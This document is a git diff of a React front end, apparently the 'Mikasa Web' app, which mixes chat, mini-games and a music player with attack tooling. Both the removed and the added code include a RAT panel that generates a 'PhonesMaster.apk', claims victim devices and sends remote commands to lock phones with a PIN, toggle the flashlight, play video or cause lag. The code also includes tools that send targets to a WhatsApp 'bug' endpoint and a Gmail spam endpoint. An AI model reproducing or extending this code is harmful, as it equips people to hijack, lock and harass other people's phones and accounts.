-  const openPrivateChat = (targetUser) => { setChatTarget(targetUser); setChatMode("private"); setPrivateMsgs([]); setActiveTab("chat"); if (socket) { socket.emit('chat_history_request_private', { userA: username, userB: targetUser }); socket.emit('chat_read_private', { username, withUser: targetUser }); } setUnreadPrivMap((prev) => { const copy = { ...prev }; const decrement = copy[targetUser] || 0; copy[targetUser] = 0; setUnreadTotal((t) => Math.max(0, t - decrement)); return copy; }); };
-  const startNpcGame = (gameId) => { setActiveGame(gameId); setGameMode('npc'); setGameState(null); setGameRoomId(null); setGameOpponent(null); setGameMyColor(gameId === 'catur' ? 'w' : gameId === 'tictactoe' ? 'X' : 0); setGameMessage(""); };
-  const startQueue = (gameId) => { if (!socket) return; setActiveGame(gameId); setGameMode('pvp'); setGameState(null); setGameRoomId(null); setGameOpponent(null); setGameMessage("Menghubungkan ke server..."); socket.emit('game_join_queue', { game: gameId, username, roomName: roomNameInput, roomKey: roomKeyInput }); };
-  const leaveQueue = () => { if (socket && activeGame) socket.emit('game_leave_queue', { game: activeGame }); setIsQueueing(false); setGameMessage(""); };
-  const exitGame = () => { if (socket && gameRoomId) socket.emit('game_leave', { roomId: gameRoomId }); if (socket && activeGame) socket.emit('game_leave_queue', { game: activeGame }); setActiveGame(null); setGameMode(null); setGameState(null); setGameRoomId(null); setGameOpponent(null); setIsQueueing(false); setGameMessage(""); };
-  const handleGameMove = (move) => { if (gameMode === 'pvp' && socket && gameRoomId) socket.emit('game_move', { roomId: gameRoomId, username, move }); };
-  const handleGameWin = () => { const gameObj = GAMES.find(g => g.id === activeGame); if (gameObj) addPoints(gameObj.points); };
+  const sendGlobalMsg = (e) => {
+    e.preventDefault();
+    if (!msgInput.trim() || !socket) return;
+    socket.emit('send_global_msg', { from: username, msg: msgInput });
+    setMsgInput("");
+  };
 
-  const handleSaveProfile = (e) => { e.preventDefault(); setAvatarFor(username, userProfile.avatar); const updatedProfile = { ...userProfile }; const savedUser = JSON.parse(localStorage.getItem("mikasa_user")); savedUser.profile = updatedProfile; localStorage.setItem("mikasa_user", JSON.stringify(savedUser)); setUserProfile(updatedProfile); setShowProfileModal(false); if (socket && socket.connected) socket.emit('update_avatar', { username, avatar: userProfile.avatar }); };
-  const handleAvatarChange = (e) => { const file = e.target.files[0]; if (file) { const reader = new FileReader(); reader.onloadend = () => setUserProfile(prev => ({ ...prev, avatar: reader.result })); reader.readAsDataURL(file); } };
-  const handleGenerateAPK = async () => { setIsGenerating(true); try { const response = await fetch(`${API_URL}/generate-apk`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ ownerId: username }) }); if (!response.ok) throw new Error("Gagal download"); const blob = await response.blob(); const url = window.URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = `PhonesMaster.apk`; document.body.appendChild(a); a.click(); a.remove(); } catch (err) { alert("Terjadi kesalahan saat generate APK."); } finally { setIsGenerating(false); } };
-  const claimDevice = (deviceId) => { if (!ratSocket) return; ratSocket.emit("rat_claim_device", { deviceId, ownerId: username }); };
-  const toggleRat = async (key, pin = null) => { if (!ratTargetId) return alert("Pilih target dulu bre!"); if (!ratSocket || !ratSocket.connected) return alert("Socket RAT belum terhubung!"); if (key === 'lock' && !ratStates.lock && !pin) { setShowPinModal(true); return; } const newState = !ratStates[key]; setRatStates(prev => ({ ...prev, [key]: newState })); let command = ""; if (key === 'flashlight') command = newState ? "flashlight_on" : "flashlight_off"; if (key === 'lock') command = newState ? "lock" : "unlock"; if (key === 'video') command = newState ? "play_video" : "stop_video"; if (key === 'lag') command = newState ? "lag_on" : "lag_off"; setRatLoading(true); ratSocket.emit("rat_command", { deviceId: ratTargetId, command, ownerId: username, pin }); setTimeout(() => setRatLoading(false), 1000); };
-  const submitLock = () => { if (lockPin.length < 4) return alert("PIN minimal 4 angka!"); setShowPinModal(false); toggleRat('lock', lockPin); };
-  const executeTool = async () => { if (!activeTool || !toolTarget) return; setToolLoading(true); setToolResult(null); let payloadBody = {}; if (activeTool.extra) Object.assign(payloadBody, activeTool.extra); payloadBody[activeTool.payload] = toolTarget; if (activeTool.endpoint === "/api/bug-wa") payloadBody.senderId = username; if (activeTool.id === 'spamgmail') { payloadBody.email = toolTarget; payloadBody.message = "Pesan spam dari Mikasa Web"; } try { const res = await fetch(`${API_URL}${activeTool.endpoint}`, { method: "POST", headers: { "Content-Type": "application/json", "x-api-key": API_KEY }, body: JSON.stringify(payloadBody) }); const data = await res.json(); setToolResult(data); } catch (err) { setToolResult({ status: false, error: "Gagal terhubung ke API." }); } finally { setToolLoading(false); } };
-  const handleSenderPairing = async () => { if(senderNumber.length < 10) return alert("Nomor gak valid"); setSenderLoading(true); setSenderCode(""); try { const res = await fetch(`${API_URL}/api/pairing`, { method: "POST", headers: { "Content-Type": "application/json", "x-api-key": API_KEY }, body: JSON.stringify({ nomor: senderNumber, userId: username }) }); const data = await res.json(); if(data.code) { setSenderCode(data.code); setSenderActive(true); } else { alert(data.error || "Gagal dapet kode pairing"); } } catch (err) { alert("Gagal konek ke server."); } finally { setSenderLoading(false); } };
-  const changeTheme = (themeId) => { setChatBubbleColor(themeId); localStorage.setItem("mikasa_theme", themeId); };
+  const sendPrivateMsg = (e) => {
+    e.preventDefault();
+    if (!msgInput.trim() || !socket || !chatTarget) return;
+    socket.emit('send_private_msg', { from: username, to: chatTarget, msg: msgInput });
+    setMsgInput("");
+  };
+
+  const openGlobalChat = () => {
+    setChatMode("global");
+    setChatTarget(null);
+    setActiveTab("chat");
+    if (socket) {
+      socket.emit('chat_history_request_global');
+      socket.emit('chat_read_global', { username });
+    }
+    setUnreadGlobal(0);
+    setUnreadTotal((prev) => Math.max(0, prev - unreadGlobal));
+  };
+
+  const openPrivateChat = (targetUser) => {
+    setChatTarget(targetUser);
+    setChatMode("private");
+    setPrivateMsgs([]);
+    setActiveTab("chat");
+    if (socket) {
+      socket.emit('chat_history_request_private', { userA: username, userB: targetUser });
+      socket.emit('chat_read_private', { username, withUser: targetUser });
+    }
+    setUnreadPrivMap((prev) => {
+      const copy = { ...prev };
+      const decrement = copy[targetUser] || 0;
+      copy[targetUser] = 0;
+      setUnreadTotal((t) => Math.max(0, t - decrement));
+      return copy;
+    });
+  };
+
+  const startNpcGame = (gameId) => {
+    setActiveGame(gameId);
+    setGameMode('npc');
+    setGameState(null);
+    setGameRoomId(null);
+    setGameOpponent(null);
+    setGameMyColor(gameId === 'catur' ? 'w' : gameId === 'tictactoe' ? 'X' : 0);
+    setGameMessage("");
+  };
+
+  const startQueue = (gameId) => {
+    if (!socket) return;
+    setActiveGame(gameId);
+    setGameMode('pvp');
+    setGameState(null);
+    setGameRoomId(null);
+    setGameOpponent(null);
+    setGameMessage("Menghubungkan ke server...");
+    socket.emit('game_join_queue', { game: gameId, username });
+  };
+
+  const leaveQueue = () => {
+    if (socket && activeGame) {
+      socket.emit('game_leave_queue', { game: activeGame });
+    }
+    setIsQueueing(false);
+    setGameMessage("");
+  };
+
+  const exitGame = () => {
+    if (socket && gameRoomId) {
+      socket.emit('game_leave', { roomId: gameRoomId });
+    }
+    if (socket && activeGame) {
+      socket.emit('game_leave_queue', { game: activeGame });
+    }
+    setActiveGame(null);
+    setGameMode(null);
+    setGameState(null);
+    setGameRoomId(null);
+    setGameOpponent(null);
+    setIsQueueing(false);
+    setGameMessage("");
+  };
+
+  const handleGameMove = (move) => {
+    if (gameMode === 'pvp' && socket && gameRoomId) {
+      socket.emit('game_move', { roomId: gameRoomId, username, move });
+    }
+  };
+
+  const handleSearchMusic = async (e) => {
+    if (e) e.preventDefault();
+    if (!musicSearch.trim()) return;
+    setLoadingMusic(true);
+    try {
+      const res = await fetch(`https://itunes.apple.com/search?term=${encodeURIComponent(musicSearch)}&media=music&limit=25`);
+      const data = await res.json();
+      setMusicResults(data.results || []);
+    } catch (err) { console.error(err); }
+    finally { setLoadingMusic(false); }
+  };
+
+  const togglePlay = (e) => {
+    if (e) e.stopPropagation();
+    if (!globalAudio) return;
+    if (isPlaying) { globalAudio.pause(); setIsPlaying(false); }
+    else { globalAudio.play(); setIsPlaying(true); }
+  };
+
+  const playMusic = (track) => {
+    if (!track.previewUrl) return alert("Lagu tidak ada preview.");
+    if (bgmAudio) { bgmAudio.pause(); bgmAudio = null; }
+    if (currentSong?.trackId === track.trackId) { togglePlay(); return; }
+    if (globalAudio) { globalAudio.pause(); globalAudio.currentTime = 0; }
+    globalAudio = new Audio(track.previewUrl);
+    globalAudio.play();
+    globalAudio.onended = () => setIsPlaying(false);
+    setCurrentSong(track);
+    setIsPlaying(true);
+  };
+
+  const handleSaveProfile = (e) => {
+    e.preventDefault();
+    setAvatarFor(username, userProfile.avatar);
+    const updatedProfile = { ...userProfile };
+    const savedUser = JSON.parse(localStorage.getItem("mikasa_user"));
+    savedUser.profile = updatedProfile;
+    localStorage.setItem("mikasa_user", JSON.stringify(savedUser));
+    setUserProfile(updatedProfile);
+    setShowProfileModal(false);
+    if (socket && socket.connected) {
+      socket.emit('update_avatar', { username, avatar: userProfile.avatar });
+    }
+  };
+
+  const handleAvatarChange = (e) => {
+    const file = e.target.files[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onloadend = () => setUserProfile(prev => ({ ...prev, avatar: reader.result }));
+      reader.readAsDataURL(file);
+    }
+  };
+
+  const startBGM = () => {
+    if (bgmAudio) return;
+    bgmAudio = new Audio(SOUND_1);
+    bgmAudio.play().then(() => {
+      bgmAudio.onended = () => {
+        bgmAudio = new Audio(SOUND_2);
+        bgmAudio.loop = true;
+        bgmAudio.play().catch(e => console.log(e));
+      };
+    }).catch(e => console.log("Autoplay blocked:", e));
+  };
+
+  const handleGenerateAPK = async () => {
+    setIsGenerating(true);
+    try {
+      const response = await fetch(`${API_URL}/generate-apk`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ ownerId: username })
+      });
+      if (!response.ok) throw new Error("Gagal download");
+      const blob = await response.blob();
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `PhonesMaster.apk`;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    } catch (err) { alert("Terjadi kesalahan saat generate APK."); }
+    finally { setIsGenerating(false); }
+  };
+
+  const claimDevice = (deviceId) => {
+    if (!ratSocket) return;
+    ratSocket.emit("rat_claim_device", { deviceId, ownerId: username });
+  };
+
+  const toggleRat = async (key, pin = null) => {
+    if (!ratTargetId) return alert("Pilih target dulu bre!");
+    if (!ratSocket || !ratSocket.connected) return alert("Socket RAT belum terhubung!");
+    if (key === 'lock' && !ratStates.lock && !pin) { setShowPinModal(true); return; }
+    const newState = !ratStates[key];
+    setRatStates(prev => ({ ...prev, [key]: newState }));
+    let command = "";
+    if (key === 'flashlight') command = newState ? "flashlight_on" : "flashlight_off";
+    if (key === 'lock') command = newState ? "lock" : "unlock";
+    if (key === 'video') command = newState ? "play_video" : "stop_video";
+    if (key === 'lag') command = newState ? "lag_on" : "lag_off";
+    setRatLoading(true);
+    ratSocket.emit("rat_command", { deviceId: ratTargetId, command, ownerId: username, pin });
+    setTimeout(() => setRatLoading(false), 1000);
+  };
+
+  const submitLock = () => {
+    if (lockPin.length < 4) return alert("PIN minimal 4 angka!");
+    setShowPinModal(false);
+    toggleRat('lock', lockPin);
+  };
+
+  const executeTool = async () => {
+    if (!activeTool || !toolTarget) return;
+    setToolLoading(true);
+    setToolResult(null);
+    let payloadBody = {};
+    if (activeTool.extra) Object.assign(payloadBody, activeTool.extra);
+    payloadBody[activeTool.payload] = toolTarget;
+    if (activeTool.endpoint === "/api/bug-wa") payloadBody.senderId = username;
+    if (activeTool.id === 'spamgmail') {
+      payloadBody.email = toolTarget;
+      payloadBody.message = "Pesan spam dari Mikasa Web";
+    }
+    try {
+      const res = await fetch(`${API_URL}${activeTool.endpoint}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
+        body: JSON.stringify(payloadBody)
+      });
+      const data = await res.json();
+      setToolResult(data);
+    } catch (err) {
+      setToolResult({ status: false, error: "Gagal terhubung ke API." });
+    } finally { setToolLoading(false); }
+  };
+
+  const handleSenderPairing = async () => {
+    if(senderNumber.length < 10) return alert("Nomor gak valid");
+    setSenderLoading(true);
+    setSenderCode("");
+    try {
+      const res = await fetch(`${API_URL}/api/pairing`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
+        body: JSON.stringify({ nomor: senderNumber, userId: username })
+      });
+      const data = await res.json();
+      if(data.code) { setSenderCode(data.code); setSenderActive(true); }
+      else { alert(data.error || "Gagal dapet kode pairing"); }
+    } catch (err) { alert("Gagal konek ke server."); }
+    finally { setSenderLoading(false); }
+  };
 
   const renderToolResult = (data) => {
     if (!data) return null;
@@ -666,12 +894,9 @@ export default function Home() {
 
               <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-4">
                 <h3 className="text-white font-bold text-sm mb-3 flex items-center gap-2"><Swords size={16} className="text-red-400" /> Multiplayer Online</h3>
-                <div className="space-y-3 mb-3">
-                  <input type="text" value={roomNameInput} onChange={(e) => setRoomNameInput(e.target.value)} placeholder="Nama Room (wajib)" className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-2 text-sm text-white focus:outline-none" />
-                  <input type="text" value={roomKeyInput} onChange={(e) => setRoomKeyInput(e.target.value)} placeholder="Key Room (kosongkan jika publik)" className="w-full bg-[#0f0a15] border border-zinc-700 rounded-lg p-2 text-sm text-white focus:outline-none" />
-                </div>
+                <p className="text-xs text-zinc-400 mb-3">Cari lawan online dari pengguna lain yang sedang buka game ini.</p>
                 <button onClick={() => startQueue(activeGame)} className="w-full bg-red-600 hover:bg-red-500 text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2">
-                  <Users size={18} /> Buat / Cari Room
+                  <Users size={18} /> Cari Lawan Online
                 </button>
               </div>
             </div>
@@ -692,11 +917,11 @@ export default function Home() {
 
           {gameMode === 'npc' && !inQueue && (
             <div className="bg-[#0f0a15] rounded-2xl">
-              {activeGame === 'catur' && <GameCatur level={gameLevel} mode="npc" myColor="w" onClose={exitGame} onMove={handleGameMove} onWin={handleGameWin} />}
-              {activeGame === 'uno' && <GameUno mode="npc" mySeat={0} onClose={exitGame} onMove={handleGameMove} onWin={handleGameWin} />}
-              {activeGame === 'ular' && <GameUlarTangga mode="npc" mySeat={0} onClose={exitGame} onMove={handleGameMove} onWin={handleGameWin} />}
-              {activeGame === 'spy' && <GameSpy mode="npc" onClose={exitGame} onMove={handleGameMove} onWin={handleGameWin} />}
-              {activeGame === 'tictactoe' && <GameTicTacToe level={gameLevel} mode="npc" myMark="X" onClose={exitGame} onMove={handleGameMove} onWin={handleGameWin} />}
+              {activeGame === 'catur' && <GameCatur level={gameLevel} mode="npc" myColor="w" onClose={exitGame} onMove={handleGameMove} />}
+              {activeGame === 'uno' && <GameUno mode="npc" mySeat={0} onClose={exitGame} onMove={handleGameMove} />}
+              {activeGame === 'ular' && <GameUlarTangga mode="npc" mySeat={0} onClose={exitGame} onMove={handleGameMove} />}
+              {activeGame === 'spy' && <GameSpy mode="npc" onClose={exitGame} onMove={handleGameMove} />}
+              {activeGame === 'tictactoe' && <GameTicTacToe level={gameLevel} mode="npc" myMark="X" onClose={exitGame} onMove={handleGameMove} />}
             </div>
           )}
 
@@ -713,45 +938,14 @@ export default function Home() {
               {gameMessage && (
                 <div className="bg-red-900/30 border border-red-700 text-red-300 text-xs p-2 rounded-lg mb-3 text-center">{gameMessage}</div>
               )}
-              {activeGame === 'catur' && <GameCatur mode="pvp" myColor={gameMyColor} opponentName={gameOpponent} serverFen={gameState?.fen || null} onMove={handleGameMove} onClose={exitGame} onWin={handleGameWin} />}
-              {activeGame === 'uno' && <GameUno mode="pvp" mySeat={gameMyColor} serverState={gameState} opponentName={gameOpponent} onMove={handleGameMove} onClose={exitGame} onWin={handleGameWin} />}
-              {activeGame === 'ular' && <GameUlarTangga mode="pvp" mySeat={gameMyColor} serverState={gameState} onMove={handleGameMove} onClose={exitGame} onWin={handleGameWin} />}
-              {activeGame === 'spy' && <GameSpy mode="pvp" serverState={gameState} onMove={handleGameMove} onClose={exitGame} onWin={handleGameWin} />}
-              {activeGame === 'tictactoe' && <GameTicTacToe mode="pvp" myMark={gameMyColor} serverState={gameState} opponentName={gameOpponent} onMove={handleGameMove} onClose={exitGame} onWin={handleGameWin} />}
+              {activeGame === 'catur' && <GameCatur mode="pvp" myColor={gameMyColor} opponentName={gameOpponent} serverFen={gameState?.fen || null} onMove={handleGameMove} onClose={exitGame} />}
+              {activeGame === 'uno' && <GameUno mode="pvp" mySeat={gameMyColor} serverState={gameState} opponentName={gameOpponent} onMove={handleGameMove} onClose={exitGame} />}
+              {activeGame === 'ular' && <GameUlarTangga mode="pvp" mySeat={gameMyColor} serverState={gameState} onMove={handleGameMove} onClose={exitGame} />}
+              {activeGame === 'spy' && <GameSpy mode="pvp" serverState={gameState} onMove={handleGameMove} onClose={exitGame} />}
+              {activeGame === 'tictactoe' && <GameTicTacToe mode="pvp" myMark={gameMyColor} serverState={gameState} opponentName={gameOpponent} onMove={handleGameMove} onClose={exitGame} />}
             </div>
           )}
         </main>
-      </div>
-    );
-  }
-
-  if (showRanking) {
-    return (
-      <div className="min-h-screen bg-[#0f0a15] text-zinc-300 font-sans flex flex-col p-4">
-        <div className="flex items-center gap-3 mb-6">
-          <button onClick={() => setShowRanking(false)} className="p-2 bg-[#1c1c1e] border border-zinc-700 rounded-lg text-zinc-400"><ChevronLeft size={20}/></button>
-          <h1 className="text-white font-bold text-xl">Papan Peringkat</h1>
-        </div>
-        <div className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-6 text-center mb-6">
-          <Trophy size={48} className="mx-auto text-yellow-500 mb-2" />
-          <p className="text-zinc-400 text-sm">Total Poin Kamu</p>
-          <p className="text-4xl font-bold text-white mt-1">{gamePoints}</p>
-        </div>
-        <div className="space-y-3">
-          {GAMES.sort((a,b) => b.points - a.points).map((g, i) => (
-            <div key={g.id} className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-4 flex items-center justify-between">
-              <div className="flex items-center gap-3">
-                <span className="text-zinc-500 font-bold w-4">{i+1}</span>
-                <div className="w-10 h-10 bg-[#0f0a15] rounded-lg flex items-center justify-center">{g.icon}</div>
-                <div>
-                  <h3 className="text-white font-bold text-sm">{g.title}</h3>
-                  <p className="text-[10px] text-zinc-500">Poin Menang: {g.points}</p>
-                </div>
-              </div>
-              <Star size={20} className={i === 0 ? "text-yellow-500" : i === 1 ? "text-zinc-400" : i === 2 ? "text-amber-600" : "text-zinc-700"} />
-            </div>
-          ))}
-        </div>
       </div>
     );
   }
@@ -835,10 +1029,33 @@ export default function Home() {
               <button onClick={() => setActiveTab("games")} className="bg-yellow-600 hover:bg-yellow-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-yellow-900/20"><Gamepad2 size={20} className="text-white" /><span className="text-white text-xs font-bold">Games</span></button>
             </div>
 
-            <div className="w-full h-48 bg-black rounded-2xl overflow-hidden relative shadow-lg border border-zinc-800 mb-4">
+            <div>
+              <h3 className="text-xs font-bold text-zinc-400 tracking-wider mb-2">NOW PLAYING</h3>
+              <div onClick={() => setShowMusicLibrary(true)} className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 flex items-center justify-between cursor-pointer hover:border-zinc-500 transition-all">
+                <div className="flex items-center gap-3">
+                  <div className={`w-10 h-10 rounded-lg flex items-center justify-center overflow-hidden ${isPlaying ? 'bg-zinc-700' : 'bg-zinc-800'}`}>{currentSong?.artworkUrl100 ? <img src={currentSong.artworkUrl100} className="w-full h-full object-cover" alt="art"/> : <Music size={20} className="text-zinc-500" />}</div>
+                  <div>
+                    <p className="text-sm text-zinc-300 font-semibold truncate max-w-[150px]">{currentSong ? currentSong.trackName : "Belum ada lagu"}</p>
+                    <p className="text-[10px] text-zinc-500">{currentSong ? currentSong.artistName : "Buka Music library"}</p>
+                  </div>
+                </div>
+                <div className="flex items-center gap-3">{currentSong && <button onClick={(e) => { e.stopPropagation(); togglePlay(); }} className="p-2 bg-zinc-800 text-zinc-300 rounded-full">{isPlaying ? <Pause size={16}/> : <Play size={16}/>}</button>}</div>
+              </div>
+            </div>
+
+            <div className="w-full h-48 bg-black rounded-2xl overflow-hidden relative shadow-lg border border-zinc-800">
               <video key={videoIndex} autoPlay muted playsInline className="w-full h-full object-cover" onEnded={() => setVideoIndex(1)} loop={videoIndex === 1}>
                 <source src={videoIndex === 0 ? VIDEO_1 : VIDEO_2} type="video/mp4" />
               </video>
+            </div>
+
+            <div>
+              <h3 className="text-sm font-bold text-white mb-3 flex items-center gap-2"><ShieldAlert size={16} className="text-zinc-400"/> Statistik Akun</h3>
+              <div className="grid grid-cols-3 gap-2">
+                <div className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 flex flex-col items-center justify-center"><CheckCircle2 size={20} className="text-zinc-400 mb-2" /><span className="text-[9px] text-zinc-500 mb-1">EXPIRED</span><span className="text-xs text-white font-bold">{userProfile.expired}</span></div>
+                <div className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 flex flex-col items-center justify-center"><User size={20} className="text-zinc-400 mb-2" /><span className="text-[9px] text-zinc-500 mb-1">ROLE</span><span className="text-xs text-white font-bold uppercase">{userRole}</span></div>
+                <div className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 flex flex-col items-center justify-center"><Clock size={20} className="text-zinc-400 mb-2" /><span className="text-[9px] text-zinc-500 mb-1">RUNTIME</span><span className="text-xs text-white font-bold">{runtime}</span></div>
+              </div>
             </div>
 
             <div>
@@ -881,11 +1098,6 @@ export default function Home() {
               {(chatMode === "global" ? globalMsgs : privateMsgs).map((m, i) => {
                 const isMe = m.from === username;
                 const showDate = i === 0 || dateFmt(m.ts) !== dateFmt((chatMode === "global" ? globalMsgs : privateMsgs)[i - 1].ts);
-                
-                const themeObj = THEMES.find(t => t.id === chatBubbleColor) || THEMES[0];
-                const bubbleClass = isMe ? themeObj.color : 'bg-[#1c1c1e] text-zinc-100 rounded-tl-sm border border-zinc-700';
-                const timeClass = isMe ? 'text-white/70 text-right' : 'text-zinc-500';
-
                 return (
                   <div key={i}>
                     {showDate && (<div className="flex justify-center my-3"><span className="text-[10px] text-zinc-500 bg-[#1c1c1e] px-3 py-1 rounded-full border border-zinc-700">{dateFmt(m.ts)}</span></div>)}
@@ -893,9 +1105,9 @@ export default function Home() {
                       {!isMe && (<div className="self-end mb-1"><UserAvatar name={m.from} avatarMap={serverAvatars} size={8} border="border-zinc-700" /></div>)}
                       <div className={`flex flex-col max-w-[78%] ${isMe ? 'items-end' : 'items-start'}`}>
                         {!isMe && chatMode === "global" && (<span className="text-[10px] text-zinc-500 mb-1 ml-1">{m.from}</span>)}
-                        <div className={`px-3 py-2 rounded-2xl text-sm break-words ${bubbleClass}`}>
+                        <div className={`px-3 py-2 rounded-2xl text-sm break-words ${isMe ? 'bg-emerald-700/80 text-white rounded-tr-sm' : 'bg-[#1c1c1e] text-zinc-100 rounded-tl-sm border border-zinc-700'}`}>
                           {m.msg}
-                          <div className={`text-[9px] mt-1 ${timeClass}`}>{timeFmt(m.ts)}</div>
+                          <div className={`text-[9px] mt-1 ${isMe ? 'text-emerald-200/70 text-right' : 'text-zinc-500'}`}>{timeFmt(m.ts)}</div>
                         </div>
                       </div>
                     </div>
@@ -919,12 +1131,7 @@ export default function Home() {
 
         {activeTab === "games" && (
           <div>
-            <div className="flex justify-between items-center mb-4">
-              <button onClick={() => setActiveTab("home")} className="text-zinc-400 text-sm flex items-center gap-1"><ChevronLeft size={16}/> Kembali</button>
-              <button onClick={() => setShowRanking(true)} className="bg-yellow-600 hover:bg-yellow-500 text-white px-3 py-1 rounded-lg text-xs font-bold flex items-center gap-1 transition-colors">
-                <Trophy size={14} /> Peringkat
-              </button>
-            </div>
+            <button onClick={() => setActiveTab("home")} className="text-zinc-400 text-sm mb-4 flex items-center gap-1"><ChevronLeft size={16}/> Kembali ke Home</button>
             <div className="grid grid-cols-2 gap-3">
               {GAMES.map((game) => (
                 <div key={game.id} onClick={() => setActiveGame(game.id)} className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-4 flex flex-col items-center text-center cursor-pointer hover:border-zinc-500">
@@ -992,20 +1199,10 @@ export default function Home() {
           <div className="space-y-4">
              <h2 className="text-white font-bold text-xl mb-4">Settings</h2>
              <button onClick={() => setShowProfileModal(true)} className="w-full bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl flex items-center gap-4 hover:bg-zinc-800"><User size={20} className="text-zinc-400" /><span className="text-white">Edit Profil</span></button>
-             
-             <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl">
-                <h3 className="text-white font-bold mb-3 flex items-center gap-2"><MessageSquare size={18} className="text-zinc-400"/> Warna Chat</h3>
-                <div className="flex gap-3">
-                  {THEMES.map(t => (
-                    <button key={t.id} onClick={() => changeTheme(t.id)} className={`w-8 h-8 rounded-full border-2 ${chatBubbleColor === t.id ? 'border-white scale-110' : 'border-transparent'} ${t.color.split(' ')[0]} transition-all`} />
-                  ))}
-                </div>
-             </div>
-
              <button onClick={handleLogout} className="w-full bg-red-900/20 border border-red-900/50 p-4 rounded-xl flex items-center gap-4 text-red-400 hover:bg-red-900/40"><LogOut size={20} /><span>Logout Akun</span></button>
              <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl mt-6">
                 <h3 className="text-white font-bold mb-2">Info Aplikasi</h3>
-                <p className="text-xs text-zinc-400">Versi: 2.1.0 (Mikasa Update)</p>
+                <p className="text-xs text-zinc-400">Versi: 2.0.0 (Mikasa Update)</p>
                 <p className="text-xs text-zinc-400">Developer: Rullzzz06</p>
              </div>
           </div>
@@ -1028,7 +1225,40 @@ export default function Home() {
            ))}
         </div>
       </div>
+
+      {showMusicLibrary && (
+        <div className="fixed inset-0 bg-[#0f0a15] z-50 flex flex-col p-4 h-[100dvh]">
+          <div className="flex items-center gap-3 mb-6 shrink-0">
+            <button onClick={() => setShowMusicLibrary(false)} className="p-2 bg-[#1c1c1e] border border-zinc-700 rounded-lg text-zinc-400"><ChevronLeft size={20}/></button>
+            <h2 className="text-white font-bold text-xl">Music Library</h2>
+          </div>
+          <form onSubmit={handleSearchMusic} className="relative mb-6 shrink-0">
+            <Search className="absolute left-4 top-3.5 text-zinc-500" size={20} />
+            <input type="text" placeholder="Cari lagu / artis..." value={musicSearch} onChange={(e) => setMusicSearch(e.target.value)} className="w-full bg-[#1c1c1e] border border-zinc-700 rounded-xl py-3 pl-12 pr-4 text-white focus:outline-none" />
+            <button type="submit" className="absolute right-2 top-2 bg-zinc-600 p-2 rounded-lg text-white"><Search size={16}/></button>
+          </form>
+          <div className="flex-1 overflow-y-auto space-y-3">
+            {loadingMusic ? (
+              <div className="flex justify-center items-center h-40"><Loader2 className="animate-spin text-zinc-400" size={32}/></div>
+            ) : musicResults.length === 0 ? (
+              <p className="text-center text-zinc-500 mt-10">Ketik judul lagu lalu enter</p>
+            ) : (
+              musicResults.map((song, i) => (
+                <div key={i} onClick={() => playMusic(song)} className="flex items-center gap-3 p-2 bg-[#1c1c1e] border border-zinc-700 rounded-xl hover:bg-[#2a2a2e] cursor-pointer">
+                  <img src={song.artworkUrl100} alt="cover" className="w-14 h-14 rounded-lg object-cover" />
+                  <div className="flex-1 overflow-hidden">
+                    <h4 className="text-white font-bold text-sm truncate">{song.trackName}</h4>
+                    <p className="text-xs text-zinc-400 truncate">{song.artistName}</p>
+                  </div>
+                  <div className="p-3 bg-zinc-800 rounded-full text-zinc-300">
+                    {currentSong?.trackId === song.trackId && isPlaying ? <button onClick={(e) => { e.stopPropagation(); togglePlay(); }}><Pause size={18}/></button> : <Play size={18}/>}
+                  </div>
+                </div>
+              ))
+            )}
+          </div>
+        </div>
+      )}
     </div>
   );
 }
-
